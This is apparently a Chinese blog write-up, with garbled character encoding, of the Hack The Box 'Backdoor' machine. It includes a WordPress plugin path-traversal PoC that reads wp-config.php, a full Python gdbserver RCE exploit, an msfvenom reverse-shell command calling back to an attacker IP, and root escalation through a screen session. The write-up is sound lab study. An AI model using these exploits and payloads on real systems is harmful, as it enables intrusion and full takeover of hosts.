title="0x03.wpscanæ‰«æ"></a>0x03.wpscanæ‰«æ</h2><p><code>å¯ä»¥å‘ç°wordpressçš„ç‰ˆæœ¬æ˜¯5.8.1ï¼Œè¿™ä¸ªç‰ˆæœ¬å†å²ä¸Šè¿˜æ²¡æœ‰çˆ†å‡ºæ¼æ´ï¼Œå¹¶ä¸”æ²¡æœ‰æ‰«æå‡ºä½¿ç”¨çš„æ’ä»¶</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# wpscan --url http://10.10.11.125                                                                                           1 â¨¯</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ Â®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#x27;_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.18</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[i] It seems like you have not updated the database for some time.</span><br><span class="line">[?] Do you want to update now? [Y]es [N]o, default: [N]y</span><br><span class="line">[i] Updating the Database ...</span><br><span class="line">[i] Update completed.</span><br><span class="line"></span><br><span class="line">[+] URL: http://10.10.11.125/ [10.10.11.125]</span><br><span class="line">[+] Started: Wed Jan  5 00:39:16 2022</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://10.10.11.125/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http://10.10.11.125/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: http://10.10.11.125/wp-content/uploads/</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://10.10.11.125/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 5.8.1 identified (Insecure, released on 2021-09-09).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://10.10.11.125/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.8.1&lt;/generator&gt;</span><br><span class="line"> |  - http://10.10.11.125/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.8.1&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: twentyseventeen</span><br><span class="line"> | Location: http://10.10.11.125/wp-content/themes/twentyseventeen/</span><br><span class="line"> | Latest Version: 2.8 (up to date)</span><br><span class="line"> | Last Updated: 2021-07-22T00:00:00.000Z</span><br><span class="line"> | Readme: http://10.10.11.125/wp-content/themes/twentyseventeen/readme.txt</span><br><span class="line"> | Style URL: http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208</span><br><span class="line"> | Style Name: Twenty Seventeen</span><br><span class="line"> | Style URI: https://wordpress.org/themes/twentyseventeen/</span><br><span class="line"> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 2.8 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: &#x27;Version: 2.8&#x27;</span><br><span class="line"></span><br><span class="line">[+] Enumerating All Plugins (via Passive Methods)</span><br><span class="line"></span><br><span class="line">[i] No plugins Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Config Backups - Time: 00:01:47 &lt;====================================================&gt; (137 / 137) 100.00% Time: 00:01:47</span><br><span class="line"></span><br><span class="line">[i] No Config Backups Found.</span><br><span class="line"></span><br><span class="line">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="line"></span><br><span class="line">[+] Finished: Wed Jan  5 00:42:56 2022</span><br><span class="line">[+] Requests Done: 180</span><br><span class="line">[+] Cached Requests: 5</span><br><span class="line">[+] Data Sent: 46.386 KB</span><br><span class="line">[+] Data Received: 14.424 MB</span><br><span class="line">[+] Memory used: 234.215 MB</span><br><span class="line">[+] Elapsed time: 00:03:40</span><br><span class="line">                                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# wpscan --url http://10.10.11.125 --wp-plugins-dir</span><br><span class="line"></span><br><span class="line">Scan Aborted: missing argument: --wp-plugins-dir</span><br><span class="line">                                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# searchsploit wordpress | grep 5.8.1                                                                                        1 â¨¯</span><br><span class="line">                                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€#  </span><br></pre></td></tr></table></figure><h2 id="0x04-ç›®å½•æ‰«æ"><a href="#0x04-ç›®å½•æ‰«æ" class="headerlink" title="0x04.ç›®å½•æ‰«æ"></a>0x04.ç›®å½•æ‰«æ</h2><p><code>æœ¬æ¬¡ä½¿ç”¨ffufï¼Œå¯ä»¥å‘ç°wp-contentï¼Œwp-includesï¼Œwp-adminçš„ç›®å½•</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://backdoor.htb/FUZZ -t 200</span><br><span class="line"></span><br><span class="line">        /&#x27;___\  /&#x27;___\           /&#x27;___\       </span><br><span class="line">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="line">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="line">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="line">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="line">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="line"></span><br><span class="line">       v1.3.1 Kali Exclusive &lt;3</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line"> :: Method           : GET</span><br><span class="line"> :: URL              : http://backdoor.htb/FUZZ</span><br><span class="line"> :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 200</span><br><span class="line"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> on atleast 2 different hosts [Status: 200, Size: 63901, Words: 3834, Lines: 330]</span></span><br><span class="line">wp-content              [Status: 301, Size: 317, Words: 20, Lines: 10]</span><br><span class="line"><span class="meta">#</span><span class="bash">                       [Status: 200, Size: 63901, Words: 3834, Lines: 330]</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> directory-list-2.3-medium.txt [Status: 200, Size: 63901, Words: 3834, Lines: 330]</span></span><br><span class="line">                        [Status: 200, Size: 63901, Words: 3834, Lines: 330]</span><br><span class="line"><span class="meta">#</span><span class="bash"> license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 63901, Words: 3834, Lines: 330]</span></span><br><span class="line"><span class="meta">#</span><span class="bash">                       [Status: 200, Size: 63901, Words: 3834, Lines: 330]</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> This work is licensed under the Creative Commons  [Status: 200, Size: 63901, Words: 3834, Lines: 330]</span></span><br><span class="line"><span class="meta">#</span><span class="bash">                       [Status: 200, Size: 63901, Words: 3834, Lines: 330]</span></span><br><span class="line">wp-includes             [Status: 301, Size: 318, Words: 20, Lines: 10]</span><br><span class="line"><span class="meta">#</span><span class="bash"> or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 63901, Words: 3834, Lines: 330]</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Copyright 2007 James Fisher [Status: 200, Size: 63901, Words: 3834, Lines: 330]</span></span><br><span class="line"><span class="meta">#</span><span class="bash">                       [Status: 200, Size: 63901, Words: 3834, Lines: 330]</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 0, Words: 1, Lines: 1]</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Priority ordered <span class="keyword">case</span> sensative list, <span class="built_in">where</span> entries were found  [Status: 200, Size: 0, Words: 1, Lines: 1]</span></span><br><span class="line">wp-admin                [Status: 301, Size: 315, Words: 20, Lines: 10]</span><br><span class="line">                        [Status: 200, Size: 0, Words: 1, Lines: 1]</span><br><span class="line">[WARN] Caught keyboard interrupt (Ctrl-C)</span><br></pre></td></tr></table></figure><h2 id="0x05-æŸ¥çœ‹æ’ä»¶ç›®å½•"><a href="#0x05-æŸ¥çœ‹æ’ä»¶ç›®å½•" class="headerlink" title="0x05.æŸ¥çœ‹æ’ä»¶ç›®å½•"></a>0x05.æŸ¥çœ‹æ’ä»¶ç›®å½•</h2><p><code>æ’ä»¶ç›®å½•pluginsé»˜è®¤åœ¨wp-contentç›®å½•ä¸‹ï¼Œå¯ä»¥å‘ç°ebook-downloadè¿™ä¹ˆä¸€ä¸ªæ’ä»¶</code></p><img src="/2022/01/05/HTB-Backdoor/image-20220105141157429.png" class><p><code>æŸ¥çœ‹readme.txtï¼Œå¯ä»¥å‘ç°ç‰ˆæœ¬æ˜¯1.1</code></p><img src="/2022/01/05/HTB-Backdoor/image-20220105141515809.png" class><h2 id="0x06-æ¼æ´åˆ©ç”¨"><a href="#0x06-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x06.æ¼æ´åˆ©ç”¨"></a>0x06.æ¼æ´åˆ©ç”¨</h2><p><code>googleå¤§æ³•å‘ç°ç›®å½•éå†æ¼æ´</code></p><img src="/2022/01/05/HTB-Backdoor/image-20220105142012159.png" class><p><code>poc</code></p><blockquote><p>/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php</p></blockquote><img src="/2022/01/05/HTB-Backdoor/image-20220105142835268.png" class><p><code>æŸ¥çœ‹æ–‡ä»¶ï¼Œå‘ç°userç”¨æˆ·</code></p><img src="/2022/01/05/HTB-Backdoor/image-20220105143020234.png" class><p><code>éå†/home/user/user.txtæ²¡æœ‰æˆåŠŸ</code></p><img src="/2022/01/05/HTB-Backdoor/image-20220105143507828.png" class><h2 id="0x07-1337ç«¯å£åˆ©ç”¨"><a href="#0x07-1337ç«¯å£åˆ©ç”¨" class="headerlink" title="0x07.1337ç«¯å£åˆ©ç”¨"></a>0x07.1337ç«¯å£åˆ©ç”¨</h2><h3 id="01-ç¬¬ä¸€ç§æ–¹æ³•ï¼Œexpdbè„šæœ¬åˆ©ç”¨"><a href="#01-ç¬¬ä¸€ç§æ–¹æ³•ï¼Œexpdbè„šæœ¬åˆ©ç”¨" class="headerlink" title="01.ç¬¬ä¸€ç§æ–¹æ³•ï¼Œexpdbè„šæœ¬åˆ©ç”¨"></a>01.ç¬¬ä¸€ç§æ–¹æ³•ï¼Œexpdbè„šæœ¬åˆ©ç”¨</h3><p><code>ç°åœ¨å®‰å…¨æµ‹è¯•å·²ç»åˆ°äº†ç“¶é¢ˆæœŸï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ä»¥1337ç«¯å£ä½œä¸ºçªç ´å£ï¼Œæ¥ç»­Googleå¤§æ³•æœç´¢1337ç«¯å£</code></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuc3BlZWRndWlkZS5uZXQvcG9ydC5waHA/cG9ydD0xMzM3">1337ç«¯å£å‚è€ƒ<i class="fa fa-external-link-alt"></i></span></p><p><code>è¿™é‡Œæˆ‘å‘ç°äº†ä¸€ä¸ªgdbserver RCE</code></p><img src="/2022/01/05/HTB-Backdoor/image-20220105193344269.png" class><p><code>poc</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Usage: python3 &#123;sys.argv[0]&#125; &lt;gdbserver-ip:port&gt; &lt;path-to-shellcode&gt;</span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line">- Victim&#x27;s gdbserver   -&gt;  10.10.10.200:1337</span><br><span class="line">- Attacker&#x27;s listener  -&gt;  10.10.10.100:4444</span><br><span class="line"></span><br><span class="line">1. Generate shellcode with msfvenom:</span><br><span class="line"><span class="meta">$</span><span class="bash"> msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.7 LPORT=6666 PrependFork=<span class="literal">true</span> -o rev.bin</span></span><br><span class="line"></span><br><span class="line">2. Listen with Netcat:</span><br><span class="line"><span class="meta">$</span><span class="bash"> nc -nlvp 6666</span></span><br><span class="line"></span><br><span class="line">3. Run the exploit:</span><br><span class="line"><span class="meta">$</span><span class="bash"> python3 &#123;sys.argv[0]&#125; 10.10.11.125:1337 rev.bin</span></span><br></pre></td></tr></table></figure><p><code>è„šæœ¬å¦‚ä¸‹</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checksum</span>(<span class="params">s: str</span>) -&gt; str:</span></span><br><span class="line">    res = sum(map(ord, s)) % <span class="number">256</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;<span class="subst">&#123;res:<span class="number">2</span>x&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ack</span>(<span class="params">sock</span>):</span></span><br><span class="line">    sock.send(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">sock, s: str</span>) -&gt; str:</span></span><br><span class="line">    sock.send(<span class="string">f&#x27;$<span class="subst">&#123;s&#125;</span>#<span class="subst">&#123;checksum(s)&#125;</span>&#x27;</span>.encode())</span><br><span class="line">    res = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    ack(sock)</span><br><span class="line">    <span class="keyword">return</span> res.decode()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>(<span class="params">sock, payload: str</span>):</span></span><br><span class="line">    send(sock, <span class="string">&#x27;qSupported:multiprocess+;qRelocInsn+;qvCont+;&#x27;</span>)</span><br><span class="line">    send(sock, <span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = send(sock, <span class="string">&#x27;vCont;s&#x27;</span>)</span><br><span class="line">        data = res.split(<span class="string">&#x27;;&#x27;</span>)[<span class="number">2</span>]</span><br><span class="line">        arch, pc = data.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        print(<span class="string">&#x27;[!] ERROR: Unexpected response. Try again later&#x27;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> arch == <span class="string">&#x27;10&#x27;</span>:</span><br><span class="line">        print(<span class="string">&#x27;[+] Found x64 arch&#x27;</span>)</span><br><span class="line">        pc = binascii.unhexlify(pc[:pc.index(<span class="string">&#x27;0*&#x27;</span>)])</span><br><span class="line">        pc += <span class="string">b&#x27;\0&#x27;</span> * (<span class="number">8</span> - len(pc))</span><br><span class="line">        addr = hex(struct.unpack(<span class="string">&#x27;&lt;Q&#x27;</span>, pc)[<span class="number">0</span>])[<span class="number">2</span>:]</span><br><span class="line">        addr = <span class="string">&#x27;0&#x27;</span> * (<span class="number">16</span> - len(addr)) + addr</span><br><span class="line">    <span class="keyword">elif</span> arch == <span class="string">&#x27;08&#x27;</span>:</span><br><span class="line">        print(<span class="string">&#x27;[+] Found x86 arch&#x27;</span>)</span><br><span class="line">        pc = binascii.unhexlify(pc)</span><br><span class="line">        pc += <span class="string">b&#x27;\0&#x27;</span> * (<span class="number">4</span> - len(pc))</span><br><span class="line">        addr = hex(struct.unpack(<span class="string">&#x27;&lt;I&#x27;</span>, pc)[<span class="number">0</span>])[<span class="number">2</span>:]</span><br><span class="line">        addr = <span class="string">&#x27;0&#x27;</span> * (<span class="number">8</span> - len(addr)) + addr</span><br><span class="line"></span><br><span class="line">    hex_length = hex(len(payload))[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;[+] Sending payload&#x27;</span>)</span><br><span class="line">    send(sock, <span class="string">f&#x27;M<span class="subst">&#123;addr&#125;</span>,<span class="subst">&#123;hex_length&#125;</span>:<span class="subst">&#123;payload&#125;</span>&#x27;</span>)</span><br><span class="line">    send(sock, <span class="string">&#x27;vCont;c&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line">        print(help)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    ip, port = sys.argv[<span class="number">1</span>].split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    file = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> open(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            payload = f.read().hex()</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        print(<span class="string">f&#x27;[!] ERROR: File <span class="subst">&#123;file&#125;</span> not found&#x27;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> sock:</span><br><span class="line">        sock.connect((ip, int(port)))</span><br><span class="line">        print(<span class="string">&#x27;[+] Connected to target. Preparing exploit&#x27;</span>)</span><br><span class="line">        exploit(sock, payload)</span><br><span class="line">        print(<span class="string">&#x27;[*] Pwned!! Check your listener&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><code>å¾—åˆ°user.txt</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><img src="/2022/01/05/HTB-Backdoor/image-20220105202853556.png" class><h3 id="02-ç¬¬äºŒç§æ–¹æ³•ï¼Œmsfåˆ©ç”¨"><a href="#02-ç¬¬äºŒç§æ–¹æ³•ï¼Œmsfåˆ©ç”¨" class="headerlink" title="02.ç¬¬äºŒç§æ–¹æ³•ï¼Œmsfåˆ©ç”¨"></a>02.ç¬¬äºŒç§æ–¹æ³•ï¼Œmsfåˆ©ç”¨</h3><p><code>ä½¿ç”¨exploit/multi/gdb/gdb_server_execæ¨¡å—è¿›è¡Œåˆ©ç”¨</code></p><img src="/2022/01/05/HTB-Backdoor/image-20220105203848648.png" class><h2 id="0x08-ææƒ"><a href="#0x08-ææƒ" class="headerlink" title="0x08.ææƒ"></a>0x08.ææƒ</h2><p><code>å°è¯•sudo -léœ€è¦userç”¨æˆ·çš„å¯†ç </code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">user@Backdoor:/home/user$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">[sudo] password for user: </span><br><span class="line"></span><br><span class="line">Sorry, try again.</span><br><span class="line">[sudo] password for user: </span><br><span class="line"></span><br><span class="line">Sorry, try again.</span><br><span class="line">[sudo] password for user: </span><br><span class="line"></span><br><span class="line">sudo: 3 incorrect password attempts</span><br><span class="line">user@Backdoor:/home/user$ </span><br></pre></td></tr></table></figure><p><code>æŸ¥çœ‹å…·æœ‰SUIDçš„å‘½ä»¤</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">user@Backdoor:/home/user$ find / -perm -4000 2&gt;/dev/null</span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/screen</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">user@Backdoor:/home/user$</span><br></pre></td></tr></table></figure><p><code>screenææƒ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">export TERM=xterm</span><br><span class="line">screen -x root/root</span><br><span class="line"></span><br><span class="line">root@Backdoor:~# whoami</span><br><span class="line">root</span><br><span class="line">root@Backdoor:~# ls</span><br><span class="line">root.txt</span><br><span class="line">root@Backdoor:~# cat root.txt</span><br><span 